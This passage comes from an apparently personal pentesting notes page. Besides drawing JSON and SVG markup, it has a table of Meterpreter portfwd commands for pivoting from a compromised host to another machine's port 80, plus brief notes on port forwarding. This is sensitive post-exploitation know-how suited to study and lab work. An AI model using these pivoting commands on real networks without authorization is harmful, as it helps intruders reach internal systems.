seed":1924624938,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Attacker","rawText":"Attacker","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Attacker","autoResize":true,"lineHeight":1.25},{"type":"text","version":215,"versionNonce":633809974,"index":"aU","isDeleted":false,"id":"iDtGWVI8","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-171.68649220149234,"y":-184.6189920159356,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":88.83990478515625,"height":25,"seed":404462826,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"}],"updated":1728524222446,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Session 1","rawText":"Session 1","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Session 1","autoResize":true,"lineHeight":1.25},{"type":"text","version":208,"versionNonce":1610217910,"index":"aW","isDeleted":false,"id":"hyxE3s4E","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":49.22003936767578,"y":-204.76873016357422,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":79.97993469238281,"height":25,"seed":1867503606,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524217227,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Port 80","rawText":"Port 80","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Port 80","autoResize":true,"lineHeight":1.25},{"type":"text","version":287,"versionNonce":289870122,"index":"aY","isDeleted":false,"id":"2kwrfjBC","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-246.68997955322266,"y":-218.3687515258789,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":77.57992553710938,"height":25,"seed":998232682,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524229970,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Port 33","rawText":"Port 33","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Port 33","autoResize":true,"lineHeight":1.25},{"type":"text","version":209,"versionNonce":1393147882,"index":"aZ","isDeleted":true,"id":"0E6gp4W0","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":35.62006378173828,"y":-208.76876068115234,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":94.55992126464844,"height":25,"seed":1564055414,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524224273,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 3","rawText":"Machine 3","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 3","autoResize":true,"lineHeight":1.25}],"appState":{"theme":"dark","viewBackgroundColor":"transparent","currentItemStrokeColor":"#1e1e1e","currentItemBackgroundColor":"transparent","currentItemFillStyle":"solid","currentItemStrokeWidth":2,"currentItemStrokeStyle":"solid","currentItemRoughness":1,"currentItemOpacity":100,"currentItemFontFamily":5,"currentItemFontSize":20,"currentItemTextAlign":"left","currentItemStartArrowhead":null,"currentItemEndArrowhead":"arrow","currentItemArrowType":"round","scrollX":489,"scrollY":382.9312438964844,"zoom":{"value":1},"currentItemRoundness":"round","gridSize":20,"gridStep":5,"gridModeEnabled":false,"gridColor":{"Bold":"rgba(217, 217, 217, 0.5)","Regular":"rgba(230, 230, 230, 0.5)"},"currentStrokeOptions":null,"frameRendering":{"enabled":true,"clip":true,"name":true,"outline":true},"objectsSnapModeEnabled":false,"activeTool":{"type":"selection","customType":null,"locked":false,"lastActiveTool":null}},"files":{}};InitialData.scrollToContent=true;App=()=>{const e=React.useRef(null),t=React.useRef(null),[n,i]=React.useState({width:void 0,height:void 0});return React.useEffect(()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height});const e=()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height})};return window.addEventListener("resize",e),()=>window.removeEventListener("resize",e)},[t]),React.createElement(React.Fragment,null,React.createElement("div",{className:"excalidraw-wrapper",ref:t},React.createElement(ExcalidrawLib.Excalidraw,{ref:e,width:n.width,height:n.height,initialData:InitialData,viewModeEnabled:!0,zenModeEnabled:!0,gridModeEnabled:!1})))},excalidrawWrapper=document.getElementById("Drawing_2024-10-09_2235.56.excalidraw.md1");ReactDOM.render(React.createElement(App),excalidrawWrapper);})();</script>

| Option                                     | Desctiprion                           |
| ------------------------------------------ | ------------------------------------- |
| `portfwd add -l 33 -p 80 -r IP_machine3`   | lport 33, rport 80, rhost IP_machine3 |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                |
| `portfwd list`                             | List porforwarding configs            |
Now we can access to `localhost:33` to acess the `machine3:80`

</div></div>


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/port-forwarding/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




- To know open ports inside the victim machine
- If I want a website to be accessible to the public (using the Internet), I have to implement port forwarding.
- Network #2 will now be able to access the webserver running on Network #1 using the public IP address of Network #1 (82.62.51.70).
- It is not the same that firewall.
- Opens specific ports (recall how packets work). 
- Port forwarding is configured at the router of a network.
<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" data-name="Layer 1" width="800" height="800" viewBox="0 0 1672.02 800">  <defs>    <linearGradient id="linear-gradient" x1="135.79" y1="153.05" x2="135.79" y2="109.1" gradientUnits="userSpaceOnUse">      <stop offset=".42" stop-color="#9da8c4"/>      <stop offset=".66" stop-color="#4f5669"/>      <stop offset=".84" stop-color="#1a1a1a"/>    </linearGradient>    <linearGradient id="linear-gradient-2" x1="100.36" y1="71.54" x2="263.58" y2="189.5" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#9da8c4"/>      <stop offset=".57" stop-color="#4f5669"/>      <stop offset="1" stop-color="#444b5c"/>    </linearGradient>    <linearGradient id="linear-gradient-3" x1="165.29" y1="118.48" x2="105.59" y2="70.61" gradientUnits="userSpaceOnUse">      <stop offset=".12" stop-color="#525a6a"/>      <stop offset=".29" stop-color="#586071"/>      <stop offset=".55" stop-color="#687286"/>      <stop offset=".66" stop-color="#727c92"/>    </linearGradient>    <linearGradient id="linear-gradient-4" x1="3683.7" y1="3407.94" x2="3683.54" y2="3418.59" gradientTransform="translate(-3547.81 -3286.49)" xlink:href="#linear-gradient"/>    <linearGradient id="linear-gradient-5" x1="135.79" y1="125.78" x2="135.79" y2="43.31" gradientUnits="userSpaceOnUse">      <stop offset=".12" stop-color="#1c2538"/>      <stop offset=".34" stop-color="#1d293f"/>      <stop offset=".66" stop-color="#223654"/>    </linearGradient>    <linearGradient id="linear-gradient-6" x1="137.27" y1="566.31" x2="137.27" y2="522.36" xlink:href="#linear-gradient"/>    <linearGradient id="linear-gradient-7" x1="101.84" y1="484.81" x2="265.05" y2="602.76" xlink:href="#linear-gradient-2"/>    <linearGradient id="linear-gradient-8" x1="166.76" y1="531.75" x2="107.06" y2="483.88" xlink:href="#linear-gradient-3"/>    <linearGradient id="linear-gradient-9" x1="3682.22" y1="2994.67" x2="3682.06" y2="3005.32" gradientTransform="translate(-3544.86 -2459.96)" xlink:href="#linear-gradient"/>    <linearGradient id="linear-gradient-10" x1="137.27" y1="539.04" x2="137.27" y2="456.57" xlink:href="#linear-gradient-5"/>    <linearGradient id="linear-gradient-11" x1="128.68" y1="230.01" x2="124.89" y2="283.08" xlink:href="#linear-gradient-2"/>    <linearGradient id="linear-gradient-12" x1="94.59" y1="245.69" x2="104.63" y2="303.68" xlink:href="#linear-gradient-2"/>    <linearGradient id="linear-gradient-13" x1="210.05" y1="198.26" x2="114.37" y2="352.18" xlink:href="#linear-gradient-2"/>    <linearGradient id="linear-gradient-14" x1="-1100.48" y1="283.9" x2="-1085.38" y2="286.53" gradientTransform="translate(-916.32 -74.01) rotate(-176.41) scale(1 -1)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#666"/>      <stop offset=".57" stop-color="#4d4d4d"/>      <stop offset="1" stop-color="#333"/>    </linearGradient>    <linearGradient id="linear-gradient-15" x1="-1107.94" y1="300.83" x2="-1070.03" y2="300.83" xlink:href="#linear-gradient-14"/>    <linearGradient id="linear-gradient-16" x1="-1110.14" y1="315.51" x2="-1071.54" y2="315.51" gradientTransform="translate(-916.32 -74.01) rotate(-176.41) scale(1 -1)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#666"/>      <stop offset=".19" stop-color="#4d4d4d"/>      <stop offset=".65" stop-color="#333"/>    </linearGradient>    <linearGradient id="linear-gradient-17" x1="1594.88" y1="351.06" x2="1594.88" y2="307.11" xlink:href="#linear-gradient"/>    <linearGradient id="linear-gradient-18" x1="1559.45" y1="269.55" x2="1722.66" y2="387.51" xlink:href="#linear-gradient-2"/>    <linearGradient id="linear-gradient-19" x1="1624.37" y1="316.49" x2="1564.67" y2="268.62" xlink:href="#linear-gradient-3"/>    <linearGradient id="linear-gradient-20" x1="2224.61" y1="3209.93" x2="2224.45" y2="3220.58" gradientTransform="translate(-629.64 -2890.47)" xlink:href="#linear-gradient"/>    <linearGradient id="linear-gradient-21" x1="1594.88" y1="323.79" x2="1594.88" y2="241.32" xlink:href="#linear-gradient-5"/>    <linearGradient id="linear-gradient-22" x1="273.34" y1="412.06" x2="360.03" y2="412.06" gradientTransform="translate(225.33 -114.03)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#1c2538"/>      <stop offset=".46" stop-color="#1e2b42"/>      <stop offset="1" stop-color="#223654"/>    </linearGradient>    <linearGradient id="linear-gradient-23" x1="273.35" y1="391.79" x2="367.98" y2="391.79" gradientTransform="translate(226.05 -114.61) rotate(.1)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#223654"/>      <stop offset=".17" stop-color="#22395e"/>      <stop offset=".45" stop-color="#244279"/>      <stop offset=".82" stop-color="#2851a6"/>      <stop offset="1" stop-color="#2a59be"/>    </linearGradient>    <linearGradient id="linear-gradient-24" x1="725.54" y1="-157.59" x2="728.8" y2="-150.57" gradientTransform="translate(-161.53 575.82) rotate(-12.06)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".89" stop-color="#1c2538"/>    </linearGradient>    <linearGradient id="linear-gradient-25" x1="772.71" y1="-144.45" x2="772.43" y2="-138.76" gradientTransform="translate(-161.53 575.82) rotate(-12.06)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".83" stop-color="#1c2538"/>    </linearGradient>    <linearGradient id="linear-gradient-26" x1="744.04" y1="-132.79" x2="750.33" y2="-129.93" gradientTransform="translate(-161.53 575.82) rotate(-12.06)" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".89" stop-color="#1c2538"/>    </linearGradient>    <linearGradient id="linear-gradient-27" x1="750.99" y1="-159" x2="756.95" y2="-158.15" xlink:href="#linear-gradient-24"/>    <linearGradient id="linear-gradient-28" x1="1030.28" y1="412.06" x2="1116.98" y2="412.06" xlink:href="#linear-gradient-22"/>    <linearGradient id="linear-gradient-29" x1="1030.29" y1="391.79" x2="1124.93" y2="391.79" gradientTransform="translate(226.05 -115.99) rotate(.1)" xlink:href="#linear-gradient-23"/>    <linearGradient id="linear-gradient-30" x1="1465.77" y1=".62" x2="1469.03" y2="7.64" xlink:href="#linear-gradient-24"/>    <linearGradient id="linear-gradient-31" x1="1512.94" y1="13.76" x2="1512.66" y2="19.44" xlink:href="#linear-gradient-25"/>    <linearGradient id="linear-gradient-32" x1="1484.27" y1="25.42" x2="1490.55" y2="28.28" xlink:href="#linear-gradient-26"/>    <linearGradient id="linear-gradient-33" x1="1491.22" y1="-.79" x2="1497.17" y2=".06" xlink:href="#linear-gradient-24"/>    <linearGradient id="linear-gradient-34" x1="940.86" y1="328.4" x2="940.86" y2="225.26" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-35" x1="942.19" y1="329" x2="942.19" y2="226.95" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#099ee7"/>      <stop offset=".5" stop-color="#07a0e8"/>      <stop offset=".53" stop-color="#03a8ec"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-36" x1="943.53" y1="329.59" x2="943.53" y2="228.64" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#09a0e8"/>      <stop offset=".5" stop-color="#07a2e9"/>      <stop offset=".54" stop-color="#03aaed"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-37" x1="944.87" y1="330.19" x2="944.87" y2="230.32" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#08a1e8"/>      <stop offset=".5" stop-color="#06a3e9"/>      <stop offset=".54" stop-color="#02abee"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-38" x1="946.21" y1="330.79" x2="946.21" y2="232.01" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#07a3e9"/>      <stop offset=".51" stop-color="#05a5ea"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-39" x1="947.54" y1="331.38" x2="947.54" y2="233.7" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#06a4ea"/>      <stop offset=".51" stop-color="#04a6eb"/>      <stop offset=".54" stop-color="#02adef"/>      <stop offset=".6" stop-color="#06aeef"/>      <stop offset=".65" stop-color="#12b2f0"/>      <stop offset=".71" stop-color="#27b9f1"/>      <stop offset=".77" stop-color="#44c2f3"/>      <stop offset=".83" stop-color="#6acef5"/>      <stop offset=".89" stop-color="#98ddf8"/>      <stop offset=".95" stop-color="#cdeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-40" x1="948.88" y1="331.98" x2="948.88" y2="235.38" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#06a6eb"/>      <stop offset=".51" stop-color="#04a8ec"/>      <stop offset=".54" stop-color="#03adef"/>      <stop offset=".6" stop-color="#07aeef"/>      <stop offset=".65" stop-color="#13b2f0"/>      <stop offset=".71" stop-color="#28b9f1"/>      <stop offset=".77" stop-color="#45c2f3"/>      <stop offset=".83" stop-color="#6bcef5"/>      <stop offset=".89" stop-color="#99ddf8"/>      <stop offset=".95" stop-color="#ceeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-41" x1="950.22" y1="332.57" x2="950.22" y2="237.07" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#05a7ec"/>      <stop offset=".52" stop-color="#04a9ed"/>      <stop offset=".54" stop-color="#03adef"/>      <stop offset=".6" stop-color="#07aeef"/>      <stop offset=".65" stop-color="#13b2f0"/>      <stop offset=".71" stop-color="#28b9f1"/>      <stop offset=".77" stop-color="#45c2f3"/>      <stop offset=".83" stop-color="#6bcef5"/>      <stop offset=".89" stop-color="#99ddf8"/>      <stop offset=".95" stop-color="#ceeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-42" x1="951.56" y1="333.17" x2="951.56" y2="238.76" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#04a9ed"/>      <stop offset=".53" stop-color="#03abee"/>      <stop offset=".54" stop-color="#03adef"/>      <stop offset=".6" stop-color="#07aeef"/>      <stop offset=".65" stop-color="#13b2f0"/>      <stop offset=".71" stop-color="#28b9f1"/>      <stop offset=".77" stop-color="#45c2f3"/>      <stop offset=".83" stop-color="#6bcef5"/>      <stop offset=".89" stop-color="#99ddf8"/>      <stop offset=".95" stop-color="#ceeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-43" x1="952.89" y1="333.77" x2="952.89" y2="240.44" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#03aaed"/>      <stop offset=".54" stop-color="#03acee"/>      <stop offset=".54" stop-color="#03adef"/>      <stop offset=".6" stop-color="#07aeef"/>      <stop offset=".65" stop-color="#13b2f0"/>      <stop offset=".71" stop-color="#28b9f1"/>      <stop offset=".77" stop-color="#45c2f3"/>      <stop offset=".83" stop-color="#6bcef5"/>      <stop offset=".89" stop-color="#99ddf8"/>      <stop offset=".95" stop-color="#ceeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-44" x1="954.23" y1="334.36" x2="954.23" y2="242.13" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#03acee"/>      <stop offset=".54" stop-color="#03adef"/>      <stop offset=".6" stop-color="#07aeef"/>      <stop offset=".65" stop-color="#13b2f0"/>      <stop offset=".71" stop-color="#28b9f1"/>      <stop offset=".77" stop-color="#45c2f3"/>      <stop offset=".83" stop-color="#6bcef5"/>      <stop offset=".89" stop-color="#99ddf8"/>      <stop offset=".95" stop-color="#ceeffb"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-45" x1="955.57" y1="334.96" x2="955.57" y2="243.82" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#2a59be"/>      <stop offset=".44" stop-color="#02adef"/>      <stop offset=".57" stop-color="#04adef"/>      <stop offset=".64" stop-color="#0cb0ef"/>      <stop offset=".71" stop-color="#1bb5f0"/>      <stop offset=".76" stop-color="#2fbbf1"/>      <stop offset=".81" stop-color="#4ac4f3"/>      <stop offset=".86" stop-color="#6acef5"/>      <stop offset=".91" stop-color="#90dbf8"/>      <stop offset=".95" stop-color="#bde9fa"/>      <stop offset=".99" stop-color="#eef9fd"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <linearGradient id="linear-gradient-46" x1="1013.56" y1="274.23" x2="873.48" y2="304.41" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#02adef"/>      <stop offset=".09" stop-color="#0cb0ef"/>      <stop offset=".23" stop-color="#27b9f1"/>      <stop offset=".43" stop-color="#54c7f4"/>      <stop offset=".65" stop-color="#93dcf8"/>      <stop offset=".91" stop-color="#e1f5fd"/>      <stop offset="1" stop-color="#fff"/>    </linearGradient>    <radialGradient id="radial-gradient" cx="961.62" cy="303.95" fx="961.62" fy="303.95" r="26.99" gradientUnits="userSpaceOnUse">      <stop offset="0" stop-color="#1c2538"/>      <stop offset="1" stop-color="#2a59be"/>    </radialGradient>  </defs>  <rect x="1292.2" y="191.97" width="354.43" height="208.03" rx="25.87" ry="25.87" style="fill: #02adef;"/>  <rect x="38.87" y="27.98" width="556.86" height="556.86" rx="17.15" ry="17.15" style="fill: #727c92;"/>  <line x1="532.49" y1="273.96" x2="161.08" y2="88.65" style="fill: none; stroke: #a3ea2a; stroke-miterlimit: 10; stroke-width: 5px;"/>  <line x1="517.81" y1="283.14" x2="126.61" y2="283.14" style="fill: none; stroke: #a3ea2a; stroke-miterlimit: 10; stroke-width: 5px;"/>  <line x1="130.2" y1="504.48" x2="519.3" y2="298.44" style="fill: none; stroke: #a3ea2a; stroke-miterlimit: 10; stroke-width: 5px;"/>  <g id="Desktop_variation" data-name="Desktop variation">    <g>      <g id="Desktop_Computer" data-name="Desktop Computer">        <g>          <path d="m135.07,61.25v57.55c0,1.92-1.33,3.58-3.2,4l-7.95,1.79-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5-.3-16.6-.64-34.26-.75-39.96-.02-.78-.24-1.54-.65-2.19-.35-.56-.83-1.05-1.42-1.41-.09-.05-.17-.1-.26-.15-.31-.17-.64-.32-.98-.41l.74-.03,2.39-.1c2.22-.09,4.42.45,6.33,1.57l18.27,10.67c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m123.91,124.6l-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5.96,5.01,6.06,29.64,14.57,34.89Z" style="fill: #525a6a;"/>          <path d="m135.07,61.25v4.4c-3.65-7.87-20.19-16.68-22.8-17.24-1.75-.37-3.35-.67-4.31-.84-.59-.11-.94-.17-.94-.17l-.74-1.4-.54-.87,2.2.07c2.56.08,5.06.8,7.26,2.09l17.84,10.42c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m107.84,128.21c-.1.03-.16.04-.16.04l.16-.04Z" style="fill: #2c2c2c;"/>          <path d="m81,47.11l24.15-1.9c2.01-.16,3.73,1.3,3.76,3.16l.97,76.93c.02,1.87-1.68,3.36-3.69,3.24l-25.11-1.53c-1.82-.11-3.24-1.51-3.24-3.21V50.31c0-1.67,1.38-3.06,3.17-3.2Z" style="fill: #89bd27;"/>          <path d="m108.45,124.48c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16V50.48c0-1.65,1.31-3.02,3.01-3.16l6.01-.49,16.86-1.38c1.9-.16,3.54,1.28,3.56,3.12l.33,34.13.49,38.71.04,3.07Z" style="fill: #727c92;"/>          <path d="m108.45,124.43c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16V50.52c0-1.64,1.31-3.02,3-3.16l6-.49,21.25,74.49.04,3.06Z" style="fill: #525a6a; opacity: .65;"/>          <path d="m79.14,51.25v4.27c0,.55.49.99,1.06.95l25.01-1.76c.52-.04.91-.45.91-.95v-4.71c0-.56-.5-1-1.08-.95l-25.01,2.2c-.51.04-.9.46-.9.95Z" style="fill: #d4d8df;"/>          <path d="m79.14,59.8v4.27c0,.55.48.98,1.04.95l25.01-1.32c.52-.03.93-.45.93-.95v-4.71c0-.55-.49-.99-1.06-.95l-25.01,1.76c-.52.04-.91.45-.91.95Z" style="fill: #d4d8df;"/>          <path d="m79.14,68.36v4.27c0,.54.46.97,1.02.95l25.01-.88c.53-.02.95-.44.95-.95v-4.71c0-.55-.48-.98-1.04-.95l-25.01,1.32c-.52.03-.93.45-.93.95Z" style="fill: #d4d8df;"/>          <polygon points="101.87 89.91 101.87 91.22 83.88 91.22 83.88 81.73 84.53 81.71 84.53 89.91 101.87 89.91" style="fill: #1c2538;"/>          <polygon points="101.87 81.28 101.87 89.91 84.53 89.91 84.53 81.74 101.87 81.28" style="fill: #d4d8df;"/>          <polyline points="86.82 118.21 86.82 119.68 89.6 119.68 89.6 118.21 86.82 118.21" style="fill: #d4d8df;"/>          <polyline points="93.53 118.37 93.53 119.84 96.8 119.84 96.8 118.37 93.53 118.37" style="fill: #d4d8df;"/>          <polygon points="101.87 85.93 84.7 86.07 84.7 86.92 101.87 86.92 101.87 85.93" style="fill: #1c2538;"/>          <path d="m108.42,124.44c.02,1.84-1.58,3.31-3.48,3.2l-23.72-1.51c-1.72-.11-3.06-1.49-3.06-3.16v-33.48c.46,5.44.05,29.13,3.99,33.32,3.19,3.4,17.46,3.27,21.97,2.24,4.44-1.02,3.66-29.42,3.8-42.31l.5,41.69Z" style="fill: #1c2538;"/>          <polygon points="132.13 66.67 132.34 117.98 130.66 118.38 130.24 65.46 132.13 66.67" style="fill: #727c92; opacity: .65;"/>          <path d="m82.17,122.84l-2.98,2.01-.3.14s.38.73,1.55,1.06l2.75-2.38s-.93-.6-1.02-.81Z" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m78.73,125.84s1.96,1.06,2.91,1.13l22.47,1.45c1.02.07,2.11-.1,2.97-.65l1.75-1.52-.09-.02-1.41.9c-1.13.72-2.53.97-3.87.89l-21.59-1.31c-1-.06-3.15-.86-3.15-.86h0Z" style="fill: #64930a;"/>          <path d="m81.92,125.05s4.88,1.34,11.05,1.52c6.17.18,11.81-.4,13.38-.85,0,0-9.98.62-13.38.49-3.4-.13-11.28-1.25-11.28-1.25" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m106.97,45.97s1.09.91,1.09,2.09c0,1.18.36,27.56.36,27.56,0,0,.81-25.58.5-27.3-.32-1.73-1.95-2.35-1.95-2.35Z" style="fill: #a3ea2a; opacity: .36;"/>        </g>      </g>      <rect x="128.73" y="116.69" width="14.14" height="11.39" style="fill: url(#linear-gradient);"/>      <rect x="94.91" y="72.58" width="81.76" height="49.13" rx="1.38" ry="1.38" style="fill: url(#linear-gradient-2);"/>      <path d="m176.67,73.96v42.41h-81.76v-42.41c0-.76.62-1.38,1.38-1.38h79.01c.76,0,1.38.62,1.38,1.38Z" style="fill: url(#linear-gradient-3);"/>      <path d="m123.45,127.03h24.68v1.05c0,.6-.49,1.08-1.08,1.08h-22.51c-.6,0-1.08-.49-1.08-1.08v-1.05h0Z" transform="translate(271.59 256.2) rotate(180)" style="fill: url(#linear-gradient-4);"/>      <circle cx="135.79" cy="119.63" r="1.41" style="fill: #1c2538;"/>      <path d="m97.93,112.99v-37.14c0-.5.4-.9.9-.9h73.92c.5,0,.9.4.9.9v37.14c0,.68-.57,1.23-1.28,1.23h-73.17c-.71,0-1.28-.55-1.28-1.23Z" style="fill: url(#linear-gradient-5);"/>      <rect x="109.34" y="82.64" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="109.36" y="85.65" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="109.36" y="88.65" width="51.72" height="1.18" style="fill: #a3ea2a;"/>      <rect x="109.34" y="95.48" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="109.36" y="98.49" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="109.36" y="101.49" width="51.72" height="1.18" style="fill: #a3ea2a;"/>    </g>  </g>  <g id="Desktop_variation-2" data-name="Desktop variation">    <g>      <g id="Desktop_Computer-2" data-name="Desktop Computer">        <g>          <path d="m136.55,474.52v57.55c0,1.92-1.33,3.58-3.2,4l-7.95,1.79-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5-.3-16.6-.64-34.26-.75-39.96-.02-.78-.24-1.54-.65-2.19-.35-.56-.83-1.05-1.42-1.41-.09-.05-.17-.1-.26-.15-.31-.17-.64-.32-.98-.41l.74-.03,2.39-.1c2.22-.09,4.42.45,6.33,1.57l18.27,10.67c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m125.38,537.86l-16.06,3.62c.5-.16,1.99-.96,2.03-5.01.02-2.17-.24-17.33-.53-33.5.96,5.01,6.06,29.64,14.57,34.89Z" style="fill: #525a6a;"/>          <path 